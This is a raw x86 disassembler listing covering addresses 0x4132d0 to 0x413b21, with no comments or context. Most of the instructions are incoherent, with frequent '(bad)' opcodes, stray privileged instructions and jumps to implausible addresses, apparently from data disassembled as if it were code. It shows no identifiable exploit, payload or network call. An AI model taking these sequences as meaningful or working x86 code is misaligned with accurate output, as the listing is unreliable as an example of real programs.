  4132d0:	add    BYTE PTR [ecx+0x452bf800],cl
  4132d6:	rcr    ecx,0x5
  4132d9:	inc    ebp
  4132da:	add    esp,ebx
  4132dc:	add    BYTE PTR [ebp-0x40],al
  4132df:	out    0x6c,eax
  4132e1:	inc    ebp
  4132e2:	inc    eax
  4132e3:	sub    eax,0x450547c1
  4132e8:	dec    esp
  4132e9:	and    BYTE PTR cs:[ebp-0x27],al
  4132ed:	jo     0x413318
  4132ef:	leave  
  4132f0:	add    BYTE PTR [esi+0xc000c0],bh
  4132f6:	lea    eax,[esp-0x40]
  4132fa:	ret    
  4132fb:	mov    dh,0x8b
  4132fd:	xor    edx,DWORD PTR [ecx+0x3]
  413300:	mov    al,BYTE PTR [ecx+0x1]
  413303:	sbb    BYTE PTR [eax],al
  413305:	stc    
  413306:	mov    esi,DWORD PTR [edx+0x8]
  413309:	(bad)  
  41330a:	ss mov eax,0xb98ac631
  413310:	add    esi,eax
  413312:	add    BYTE PTR [edx-0x444d39f7],bh
  413318:	add    esi,eax
  41331a:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  413321:	mov    BYTE PTR [eax],0xbe
  413324:	or     BYTE PTR [ebx],dh
  413326:	dec    ecx
  413327:	lea    eax,[ebx]
  413329:	or     eax,0x18fc0fc7
  41332e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332f:	(bad)  
  413331:	fiadd  WORD PTR [ebp-0x78]
  413334:	jae    0xed763a83
  41333a:	or     BYTE PTR [ebp+0x7],al
  41333d:	in     eax,dx
  41333e:	pushf  
  41333f:	inc    ebp
  413340:	xor    bl,al
  413342:	pop    esi
  413343:	inc    ebp
  413344:	shl    esp,0xc
  413347:	inc    ebp
  413348:	sub    cl,0x1
  41334b:	inc    ebp
  41334c:	add    bh,bl
  41334e:	add    BYTE PTR [ebp-0x7b],al
  413351:	loopne 0x41334b
  413353:	inc    ebp
  413354:	ret    0xe7
  413357:	inc    ebp
  413358:	mov    esi,DWORD PTR [eax-0x7f]
  41335b:	leave  
  41335c:	and    al,0x44
  41335e:	add    BYTE PTR [eax+0x331cb68b],dh
  413364:	mov    DWORD PTR [ebx],eax
  413366:	sbb    al,0x41
  413368:	(bad)  
  413369:	sbb    al,ah
  41336b:	stc    
  41336c:	test   DWORD PTR [edx-0x8],esi
  41336f:	lea    edi,[edi-0x7007a98]
  413375:	mov    DWORD PTR [ebp-0x2c],edi
  413378:	(bad)  
  413379:	dec    ebp
  41337a:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  413381:	add    edx,eax
  413383:	(bad)  
  413384:	(bad)  
  413385:	inc    ebx
  413387:	jmp    FWORD PTR [edx-0x38]
  41338a:	(bad)  
  41338b:	or     al,ah
  41338d:	jge    0x413355
  41338f:	mov    ebp,0x5a8533e4
  413395:	clc    
  413396:	leave  
  413397:	inc    ebp
  413398:	add    BYTE PTR [ebx+0xd8c8d],cl
  41339e:	rdpmc  
  4133a0:	sbb    BYTE PTR [edi+0x7de08da],bh
  4133a6:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  4133ad:	cmovne edx,ebx
  4133b0:	jmp    0x4133b2
  4133b2:	inc    ebp
  4133b3:	mov    ebp,ebp
  4133b5:	sbb    al,0x45
  4133b7:	mov    ebx,ebx
  4133b9:	add    DWORD PTR [ebp+0x0],eax
  4133bc:	out    dx,al
  4133bd:	add    DWORD PTR [ebp+0x4d],eax
  4133c0:	sub    eax,0x2e80458b
  4133c5:	add    BYTE PTR [ebp-0x77],al
  4133c8:	jo     0x413434
  4133ca:	leave  
  4133cb:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4133d3:	inc    ebp
  4133d4:	add    ebx,edi
  4133d6:	inc    ecx
  4133d7:	out    0x18,eax
  4133d9:	(bad)  
  4133da:	stc    
  4133db:	int3   
  4133dc:	jb     0x413368
  4133de:	(bad)  
  4133df:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4133e5:	or     dh,al
  4133e7:	dec    esi
  4133e8:	mov    dl,0xf3
  4133ea:	mov    BYTE PTR [ebp-0x4d],0x89
  4133ee:	(bad)  
  4133ef:	loopne 0x4133a5
  4133f1:	inc    esi
  4133f3:	lea    esi,[ebp-0x49003924]
  4133f9:	push   eax
  4133fa:	mov    BYTE PTR [ebp-0x49],0x33
  4133fe:	xor    eax,DWORD PTR [ebx]
  413400:	lea    edx,[eax+0xd]
  413403:	inc    ebp
  413404:	jae    0x8c1b9a22
  41340a:	ficomp WORD PTR [eax+ecx*4]
  41340d:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  413414:	test   esi,edi
  413416:	(bad)  
  413417:	(bad)  
  413418:	inc    DWORD PTR [eax]
  41341a:	inc    ebp
  41341b:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  413421:	test   DWORD PTR [ebx],edx
  413423:	jne    0x4133ae
  413425:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  41342f:	jmp    0x12534bd
  413434:	inc    ebp
  413435:	jne    0x413419
  413437:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  41343e:	mov    BYTE PTR [ebp+0x45009c01],cl
  413444:	shl    BYTE PTR [eax],0x55
  413447:	push   cx
  413449:	mov    bx,0x7245
  41344d:	gs add bh,al
  413450:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  413457:	inc    ebp
  413458:	dec    ebp
  413459:	into   
  41345a:	mov    esp,ebx
  41345c:	jl     0x413425
  41345e:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  413465:	inc    ebp
  413466:	mov    edi,ebx
  413468:	add    ebp,esp
  41346a:	add    BYTE PTR [esi+0x1],ah
  41346d:	inc    ebp
  41346e:	or     BYTE PTR [edi],bh
  413470:	inc    ebp
  413471:	(bad)  
  413472:	in     eax,dx
  413473:	fsubr  st(4),st
  413475:	inc    edi
  413477:	add    dl,al
  413479:	add    al,ah
  41347b:	call   0x864cf0
  413480:	pop    esi
  413481:	test   DWORD PTR [eax],ecx
  413483:	dec    dl
  413485:	(bad)  
  413486:	jmp    0x413fbd10
  41348b:	push   DWORD PTR [ebp-0x75]
  41348e:	(bad)  
  41348f:	loopne 0x41345d
  413491:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  41349b:	push   eax
  41349c:	inc    DWORD PTR [ebp-0x75]
  41349f:	mov    esp,eax
  4134a1:	cwde   
  4134a2:	mov    DWORD PTR [eax],0xff8bffc3
  4134a8:	sbb    al,0x8
  4134aa:	ror    BYTE PTR [ebp+0x50],0x51
  4134ae:	inc    ebp
  4134af:	ror    BYTE PTR [ebx+0x65987d],1
  4134b5:	test   edi,eax
  4134b7:	add    al,0xdc
  4134b9:	add    bh,bh
  4134bb:	push   0x1
  4134bd:	add    BYTE PTR [eax],al
  4134bf:	mov    edi,edi
  4134c1:	inc    WORD PTR [ebp+0x8]
  4134c5:	add    eax,0xd
  4134c8:	(bad)  
  4134ca:	xor    eax,0x782ec89
  4134cf:	push   ecx
  4134d0:	cli    
  4134d1:	popw   es
  4134d3:	push   ebp
  4134d4:	xchg   BYTE PTR [ebx-0x76740800],al
  4134da:	sbb    al,0x86
  4134dc:	test   DWORD PTR [ecx-0x2],edx
  4134df:	call   WORD PTR [ebp-0x40]
  4134e3:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  4134e7:	mov    eax,ebx
  4134e9:	mov    dh,BYTE PTR ds:0xc7666851
  4134ef:	push   ebp
  4134f0:	fsub   QWORD PTR [esi+0x0]
  4134f3:	dec    ebp
  4134f4:	inc    ebp
  4134f5:	mov    edx,0xec4ec0
  4134fa:	(bad)  
  4134fb:	retf   0x89a0
  4134fe:	fist   DWORD PTR [eax+0x454ae1]
  413504:	jmp    0xa8b5:0xc7663e8b
  41350b:	jmp    edx
  41350d:	(bad)  
  41350e:	in     eax,dx
  41350f:	lock (bad) 
  413511:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  413518:	(bad)  
  413519:	xor    eax,0x700089ff
  41351e:	add    bh,bh
  413520:	stos   DWORD PTR es:[edi],eax
  413521:	data16 add BYTE PTR [ebp-0x1b0077],al
  413528:	inc    DWORD PTR [ecx-0x73]
  41352b:	data16 fadd QWORD PTR [ebp-0xaf0001]
  413532:	inc    ebp
  413533:	shl    BYTE PTR [ebx],0x66
  413536:	add    eax,DWORD PTR [ebp-0xba00b0]
  41353c:	add    DWORD PTR [ecx+0x44],0x66
  413540:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  413546:	add    DWORD PTR [ecx-0xcf8600],ecx
  41354c:	push   ebp
  41354d:	lea    dx,[ebp-0x28]
  413554:	add    BYTE PTR [ebp-0x25],0xf
  413558:	jge    0xff42345f
  41355e:	mov    ecx,0xc34fc7
  413563:	rol    ecx,0x89
  413566:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  41356a:	ror    BYTE PTR [ebx-0x48990775],0x55
  413571:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  413578:	test   BYTE PTR [ecx-0x3f997f3e],cl
  41357e:	push   ebp
  41357f:	mov    DWORD PTR [ebp-0x76761480],ecx
  413585:	or     BYTE PTR [eax+0x6600c265],0x45
  41358c:	push   ebp
  41358d:	xor    DWORD PTR [ebp-0x76381e64],ecx
  413593:	aam    0x8c
  413595:	test   DWORD PTR [ecx-0x3dba7108],ecx
  41359b:	cmp    eax,0xc78b9c00
  4135a0:	data16 hlt 
  4135a2:	dec    ebp
  4135a3:	test   DWORD PTR [ecx+0x454ff8],edi
  4135a9:	xor    ecx,esi
  4135ab:	lahf   
  4135ac:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  4135b2:	mov    eax,DWORD PTR [ecx]
  4135b4:	data16 add BYTE PTR [ebp-0x7400bb],dh
  4135bb:	sbb    al,0x71
  4135bd:	dec    ebp
  4135be:	mov    si,WORD PTR [ebp-0xff0074]
  4135c5:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  4135cb:	add    BYTE PTR [ebp-0x760fd477],cl
  4135d1:	jne    0x413647
  4135d3:	test   edi,edi
  4135d5:	jne    0x41355a
  4135d7:	(bad)  
  4135d8:	sti    
  4135d9:	sbb    BYTE PTR [ecx-0x1789ab],cl
  4135df:	cld    
  4135e0:	(bad)  
  4135e1:	jmp    DWORD PTR [ecx]
  4135e3:	inc    ebp
  4135e4:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  4135ea:	data16 cmp al,0x8d
  4135ed:	push   cs
  4135ee:	inc    DWORD PTR [ebp-0x1]
  4135f1:	test   DWORD PTR [ecx-0x838c],ecx
  4135f7:	sbb    al,0x8b
  4135f9:	lock clc 
  4135fb:	push   DWORD PTR [edi-0xe39375]
  413601:	xor    BYTE PTR [ebx],0x1
  413604:	add    eax,DWORD PTR [eax]
  413606:	xor    eax,DWORD PTR [eax]
  413608:	mov    WORD PTR [ebp-0xba003d],0x4575
  413611:	mov    ecx,DWORD PTR [edi]
  413613:	sbb    al,0x4d
  413615:	mov    DWORD PTR [ebx],esi
  413617:	add    DWORD PTR [ebx],eax
  413619:	add    BYTE PTR [ebx],dh
  41361b:	xor    DWORD PTR [esi-0x80],esp
  41361e:	inc    ebp
  41361f:	add    DWORD PTR [ebx],esi
  413621:	add    BYTE PTR [esi+0x50],ah
  413624:	inc    ebp
  413625:	jmp    0x863890
  41362a:	add    DWORD PTR [eax+0xc70194],0xffffffec
  413631:	or     BYTE PTR [ebp+0x4501f845],dh
  413637:	jmp    0xdd392d
  41363c:	(bad)  
  41363d:	push   cs
  41363e:	in     al,0xc9
  413640:	test   DWORD PTR [ebp+0x4502f8],eax
  413646:	xor    ecx,DWORD PTR [ebp-0x64]
  413649:	mov    eax,edi
  41364b:	mov    esp,esp
  41364d:	push   eax
  41364e:	add    eax,0x45fff885
  413653:	dec    DWORD PTR [ebx+0x339445]
  413659:	add    ecx,DWORD PTR [ecx+0x452ce889]
  41365f:	dec    DWORD PTR [ebx-0x4e0be375]
  413665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413666:	add    edi,edi
  413668:	add    bh,bh
  41366a:	push   cs
  41366b:	xor    eax,DWORD PTR [eax+0x890103]
  413671:	xor    BYTE PTR [ebp-0x1],al
  413674:	mov    DWORD PTR [ebp-0x36df38],ecx
  41367a:	push   cs
  41367b:	push   eax
  41367c:	jne    0x4136c3
  41367e:	mov    esi,DWORD PTR [ebx]
  413680:	sbb    al,0x3
  413682:	jne    0x4136d4
  413684:	inc    DWORD PTR [ebp-0x75]
  413687:	add    eax,0x800f0
  41368c:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  413692:	mov    DWORD PTR [ecx],eax
  413694:	sbb    BYTE PTR [eax],al
  413696:	leave  
  413697:	test   DWORD PTR [edi-0x1],eax
  41369a:	jne    0x41369b
  41369c:	call   0xff4221a1
  4136a1:	xor    BYTE PTR [ebp+0x4d],al
  4136a4:	mov    edi,edi
  4136a6:	enter  0x8,0x4d
  4136aa:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  4136b0:	mov    eax,DWORD PTR [eax]
  4136b2:	sbb    al,0x1
  4136b4:	sbb    DWORD PTR [ebp+0x4d],eax
  4136b7:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  4136bd:	inc    eax
  4136be:	dec    DWORD PTR [ecx-0x27d775]
  4136c4:	add    BYTE PTR [ebx-0x38d72b01],cl
  4136ca:	xchg   ecx,eax
  4136cb:	ret    
  4136cc:	add    BYTE PTR [ebp-0x830075],al
  4136d2:	add    BYTE PTR [ebp-0x75],al
  4136d5:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  4136db:	lea    edi,[edi+0x20]
  4136de:	add    bh,bh
  4136e0:	mov    edx,DWORD PTR [eax-0x7b]
  4136e3:	inc    ebp
  4136e4:	rdpmc  
  4136e6:	jne    0x4136eb
  4136e8:	add    BYTE PTR [eax-0x75],dl
  4136eb:	inc    ebp
  4136ec:	call   0x40413ff6
  4136f1:	add    BYTE PTR [ecx-0xe3d775],cl
  4136f7:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  4136fe:	ret    
  4136ff:	inc    DWORD PTR [ebp-0xff0001]
  413705:	add    BYTE PTR [ebp-0x4b],al
  413708:	cmp    edi,0x24
  41370b:	(bad)  
  41370c:	push   DWORD PTR [eax]
  41370e:	add    BYTE PTR [ebp-0x39],dl
  413711:	test   ebx,eax
  413713:	je     0x41369a
  413715:	mov    edi,edi
  413717:	sbb    bh,bh
  413719:	test   DWORD PTR gs:[eax],eax
  41371c:	(bad)  
  41371d:	js     0x41371e
  41371f:	add    BYTE PTR [ebx-0x38b21fdd],cl
  413725:	sub    eax,ebx
  413727:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  41372d:	add    eax,DWORD PTR [eax]
  41372f:	dec    ebp
  413730:	push   eax
  413731:	mov    al,BYTE PTR [ebp+0x1]
  413734:	mov    eax,DWORD PTR [ebp-0x68]
  413737:	mov    eax,DWORD PTR [eax]
  413739:	cld    
  41373a:	(bad)  
  41373b:	or     BYTE PTR [eax],ah
  41373d:	dec    ebp
  41373e:	inc    DWORD PTR [eax+0x4]
  413741:	push   ecx
  413742:	add    BYTE PTR [edx-0x1],dh
  413745:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  41374b:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  413755:	add    ecx,DWORD PTR [ecx-0xf037477]
  41375b:	push   ecx
  41375c:	xor    BYTE PTR [ebx],al
  41375e:	inc    ebp
  41375f:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  413765:	(bad)  
  413766:	push   eax
  413768:	inc    DWORD PTR [eax]
  41376a:	inc    ebp
  41376b:	add    BYTE PTR [ebx],dh
  41376d:	add    BYTE PTR [ebx],0x0
  413770:	mov    DWORD PTR [ebx-0x150007d4],eax
  413776:	lea    edx,[ebp-0x6c]
  413779:	je     0x413700
  41377b:	(bad)  
  41377c:	dec    DWORD PTR [eax]
  41377e:	call   DWORD PTR [ebp-0x7b]
  413781:	mov    edi,edi
  413783:	hlt    
  413784:	call   DWORD PTR [ebp-0x75]
  413787:	mov    esp,eax
  413789:	cwde   
  41378a:	(bad)  
  41378b:	mov    bh,0xc3
  41378d:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  413793:	add    DWORD PTR [eax],0x450050ff
  413799:	mov    DWORD PTR [ebx+0x9598c8],ecx
  41379f:	inc    edi
  4137a1:	jmp    DWORD PTR [eax]
  4137a3:	jmp    0xcd00:0x640481ff
  4137aa:	mov    DWORD PTR [ebx],esi
  4137ac:	and    al,0x81
  4137ae:	push   DWORD PTR [edx]
  4137b0:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  4137b7:	add    esi,DWORD PTR [eax]
  4137b9:	enter  0x3c45,0x83
  4137bd:	add    ah,bh
  4137bf:	adc    DWORD PTR [ebx+0x768b5055],eax
  4137c5:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  4137cb:	mov    esi,eax
  4137cd:	xor    BYTE PTR [ebp+0x45],cl
  4137d0:	jmp    0x41375d
  4137d2:	mov    ebx,DWORD PTR [eax]
  4137d4:	in     al,dx
  4137d5:	inc    ebp
  4137d6:	or     al,0x2
  4137d8:	dec    DWORD PTR [ebp-0x4]
  4137db:	jne    0x413832
  4137dd:	mov    ecx,DWORD PTR [eax+0x18558be8]
  4137e3:	mov    edi,DWORD PTR [ebx]
  4137e5:	lock push eax
  4137e7:	xchg   ecx,eax
  4137e8:	jmp    0x34185ed
  4137ed:	adc    al,0x8b
  4137ef:	inc    ebp
  4137f0:	mov    al,ds:0x8b04008b
  4137f5:	push   ebp
  4137f6:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  4137fc:	push   ebp
  4137fd:	test   DWORD PTR [ebx-0x2900d701],ecx
  413803:	inc    ebp
  413804:	dec    ebp
  413805:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  41380b:	mov    DWORD PTR [eax],0xe9ff0020
  413811:	add    al,0x0
  413813:	add    BYTE PTR [eax],al
  413815:	mov    eax,edx
  413817:	push   eax
  413818:	rol    DWORD PTR [ebp-0xb0077],1
  41381e:	bound  eax,QWORD PTR [ebp+0x50]
  413821:	xor    ecx,DWORD PTR [ecx+0x55899803]
  413827:	sub    al,0x89
  413829:	push   esp
  41382b:	lea    edx,[ebp-0x6c]
  41382e:	jne    0xffd73746
  413834:	inc    DWORD PTR [ebp-0x1d0001]
  41383a:	jnp    0xc7971840
  413840:	mov    eax,ebx
  413842:	fs mov edi,edi
  413845:	sbb    al,0xc1
  413847:	out    dx,al
  413848:	or     al,0x0
  41384a:	ret    0x8d50
  41384d:	inc    ebp
  41384e:	dec    DWORD PTR [ebx+0xfa98d7]
  413854:	test   edi,edi
  413856:	clc    
  413857:	call   FWORD PTR [edi]
  413859:	or     BYTE PTR [eax],cl
  41385b:	inc    ebp
  41385c:	dec    ebp
  41385d:	inc    DWORD PTR [ebx+0x74803114]
  413863:	add    DWORD PTR [ebx+0x45fc00],ecx
  413869:	call   DWORD PTR [eax+edx*1]
  41386c:	add    ecx,DWORD PTR [ebp-0x38]
  41386f:	push   esi
  413870:	adc    al,0x8
  413872:	mov    edx,DWORD PTR [ebp-0x14]
  413875:	mov    ecx,DWORD PTR [ebp-0x4]
  413878:	add    DWORD PTR [ebp-0x68],0xffffff8d
  41387c:	inc    DWORD PTR [esp+esi*8]
  41387f:	inc    ebp
  413880:	stos   BYTE PTR es:[edi],al
  413881:	mov    edx,DWORD PTR [ebp+0x1c]
  413884:	add    DWORD PTR [ebp-0x10],eax
  413887:	mov    edx,DWORD PTR [ebp-0x70]
  41388a:	cmp    eax,DWORD PTR [eax]
  41388c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41388d:	mov    eax,DWORD PTR [eax]
  41388f:	sbb    al,0x73
  413891:	add    BYTE PTR [ebx],0x1
  413894:	call   0x89718899
  413899:	xor    eax,ebp
  41389b:	pop    ds
  41389c:	inc    ebp
  41389d:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4138a3:	(bad)  
  4138a4:	push   DWORD PTR [edi]
  4138a6:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  4138ac:	push   DWORD PTR [ebx-0x1]
  4138af:	mov    eax,DWORD PTR [ebp-0x740075]
  4138b5:	sub    eax,DWORD PTR [eax]
  4138b7:	add    eax,DWORD PTR [eax]
  4138b9:	mov    DWORD PTR [ecx+0x5f],eax
  4138bc:	mov    DWORD PTR [ebx+0x28],ebx
  4138bf:	ret    0xff
  4138c2:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  4138c8:	ret    
  4138c9:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4138cf:	add    BYTE PTR [ebp-0x7d],al
  4138d2:	mov    DWORD PTR [eax],eax
  4138d4:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  4138db:	sar    bh,cl
  4138dd:	test   BYTE PTR [eax+0x1],dl
  4138e0:	inc    ebp
  4138e1:	add    BYTE PTR [ebx],dh
  4138e3:	test   BYTE PTR [ebx],0x84
  4138e6:	push   eax
  4138e7:	add    BYTE PTR [ebp+0x0],al
  4138ea:	add    eax,0x86
  4138ef:	add    BYTE PTR [ebx-0x7f7be340],cl
  4138f5:	add    BYTE PTR [ecx],al
  4138f7:	add    BYTE PTR [eax],al
  4138f9:	mov    esi,0x550030
  4138fe:	mov    ecx,DWORD PTR [edi]
  413900:	sbb    al,0xda
  413902:	jne    0x413904
  413904:	mov    edi,DWORD PTR [ecx]
  413906:	xor    BYTE PTR [eax+eax*1],0x84
  41390a:	add    eax,DWORD PTR [eax]
  41390c:	cld    
  41390d:	add    BYTE PTR [ebp-0x4f],dh
  413910:	mov    eax,DWORD PTR [ecx]
  413912:	cld    
  413913:	add    BYTE PTR [ecx-0x1bff009b],cl
  413919:	retf   0xe45
  41391c:	add    eax,edx
  41391e:	sbb    al,0xb7
  413920:	dec    ebp
  413921:	or     al,0x89
  413923:	dec    ebp
  413924:	sbb    al,0xf
  413926:	inc    ebp
  413927:	dec    eax
  413928:	mov    eax,DWORD PTR [ebx]
  41392a:	sbb    al,0xf
  41392c:	nop
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [ebp-0x7674ebbb],cl
  413936:	mov    eax,gs
  413938:	add    bh,bh
  41393a:	mov    edi,edi
  41393c:	cmp    DWORD PTR [edi+0x72],edx
  41393f:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  413945:	gs cmp al,0x0
  413948:	je     0x413920
  41394a:	push   eax
  41394b:	sar    BYTE PTR [eax],1
  41394d:	mov    bh,0x3e
  41394f:	push   cs
  413950:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  413956:	add    DWORD PTR [ecx+0x12],ebp
  413959:	dec    edx
  41395a:	(bad)  
  41395b:	mov    eax,edx
  41395d:	in     al,dx
  41395e:	adc    DWORD PTR [ecx],esi
  413960:	pop    esi
  413961:	inc    ecx
  413962:	leave  
  413963:	or     DWORD PTR [eax],ebx
  413965:	gs push ebp
  413967:	add    ah,ch
  413969:	into   
  41396a:	in     al,dx
  41396b:	enter  0xb756,0xf0
  41396f:	push   cs
  413970:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  41397a:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  413980:	jnp    0x7441be88
  413986:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  41398c:	add    BYTE PTR [edi],cl
  41398e:	mov    edi,DWORD PTR [ecx-0x78]
  413991:	ltr    WORD PTR [ecx-0x7b]
  413995:	dec    DWORD PTR [edi]
  413997:	clc    
  413998:	out    0x45,eax
  41399a:	add    BYTE PTR [eax],cl
  41399c:	cmp    ebx,0xffffff8c
  41399f:	jge    0x4139a1
  4139a1:	jb     0x4139b3
  4139a3:	je     0x503a23
  4139a9:	pop    edx
  4139aa:	push   esi
  4139ab:	mov    ecx,DWORD PTR [edi]
  4139ad:	in     al,dx
  4139ae:	rol    DWORD PTR [ebp+0x0],1
  4139b1:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4139b8:	cmp    DWORD PTR [ecx],0xfffffff0
  4139bb:	hlt    
  4139bc:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4139c2:	(bad)  
  4139c4:	push   eax
  4139c5:	jns    0xb8411e43
  4139cb:	lock push cs
  4139cd:	ror    edx,0x3
  4139d0:	test   BYTE PTR [ecx+0x5500e800],cl
  4139d6:	dec    eax
  4139d7:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4139db:	(bad)  
  4139dc:	mov    esi,0x7f33ff5f
  4139e1:	inc    eax
  4139e2:	test   DWORD PTR [edx],eax
  4139e4:	je     0x4139a6
  4139e6:	mov    ecx,ecx
  4139e8:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4139ec:	and    eax,DWORD PTR [eax+0xf0103]
  4139f2:	jp     0x4139e0
  4139f4:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4139f8:	add    edx,DWORD PTR [edi+0x74]
  4139fb:	sbb    BYTE PTR [ebp+0x4d001484],cl
  413a01:	add    BYTE PTR [ebp-0x74c48bbb],al
  413a07:	je     0x41398c
  413a09:	cmp    eax,edi
  413a0b:	js     0x413a30
  413a0d:	add    eax,0xeb0fc003
  413a12:	jns    0x41399f
  413a14:	vmread DWORD PTR [ecx+0x45],ebx
  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
